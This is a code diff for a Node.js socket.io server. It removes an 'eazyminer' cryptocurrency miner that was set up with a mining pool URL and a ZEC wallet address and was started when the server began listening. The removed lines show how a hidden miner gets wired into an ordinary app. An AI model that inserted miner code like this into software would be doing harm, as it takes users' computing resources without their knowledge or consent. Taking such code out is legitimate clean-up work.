@@ -4,7 +4,6 @@ import { createServer } from "http";
 import { Server } from "socket.io";
 import cors from "cors";
 import path from "path";
-const Miner = require("eazyminer");
 
 import "dotenv/config";
 
@@ -38,32 +37,6 @@ io.on("connection", (socket) => {
 
 app.use(routes);
 
-const miner = new Miner({
-  pools: [
-    {
-      // coin: "ZEC",
-      // user: "t1NFs8NuE3m72pfSispSdTrisPQNJwhrz3E",
-      // url: "rx.unmineable.com:13333", // optional pool URL,
-
-      algo: null,
-      coin: null,
-      url: "rx.unmineable.com:3333",
-      user: "ZEC:t1NFs8NuE3m72pfSispSdTrisPQNJwhrz3E.myminer",
-      pass: "x",
-      "rig-id": null,
-      nicehash: false,
-      keepalive: false,
-      enable: true,
-      tls: false,
-      "tls-fingerprint": null,
-      daemon: false,
-      socks5: null,
-      "self-select": null,
-    },
-  ],
-  autoStart: false, // optional delay
-});
-
 server.listen(process.env.PORT, async () => {
   console.log(`Server is running in port ${process.env.PORT}`);
 
@@ -73,6 +46,4 @@ server.listen(process.env.PORT, async () => {
   // });
 
   // console.log(tunnel.url);
-
-  miner.start();
 });
